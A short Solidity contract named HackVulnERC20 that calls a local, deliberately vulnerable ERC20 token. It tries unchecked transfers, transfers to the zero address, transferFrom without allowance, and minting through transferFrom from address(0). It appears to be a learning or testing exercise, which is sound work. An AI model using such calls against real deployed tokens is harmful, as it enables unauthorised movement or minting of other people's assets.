// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import "./MyVulnERC20.sol";

contract HackVulnERC20 {
    MyVulnERC20 public vulnERC20;
    uint8 public counter;

    constructor(address _target) {
        vulnERC20 = MyVulnERC20(_target);
    }

    // Function: Transfer any amount to a specific address
    function transferToAnyAmount(address to, uint value) public returns (bool) {
        // should revert with no 
        return vulnERC20.transfer(to, value);
    }

    // Function: Transfer to the zero address
    function transferToZero(uint value) public returns (bool) {
        return vulnERC20.transfer(address(0), value);
    }

    // Function: Transfer from one address to another without allowance checks
    function transferFromToAny(
        address from,
        address to,
        uint value
    ) public returns (bool) {
        return vulnERC20.transferFrom(from, to, value);
    }

    // Function: Transfer from one address to the zero address
    function transferFromToZero(
        address from,
        uint value
    ) public returns (bool) {
        return vulnERC20.transferFrom(from, address(0), value);
    }

    // Function: Mint tokens to a specific address
    function mint(address to, uint value) public returns (bool) {
        return vulnERC20.transferFrom(address(0), to, value);
    }

    // Call all the functions with predetermined but random values
    function callAll() public {
        address alice = address(0x123); // Example addresses
        address bob = address(0x321); // Example addresses

        uint value = 100;
        
        transferToAnyAmount(alice, value);
        // transferToZero(value);
        // transferFromToAny(alice, bob, value);
        // transferFromToZero(alice, value);
        // mint(alice, value);
        // If didnt revert, means all was executed.
    }
}
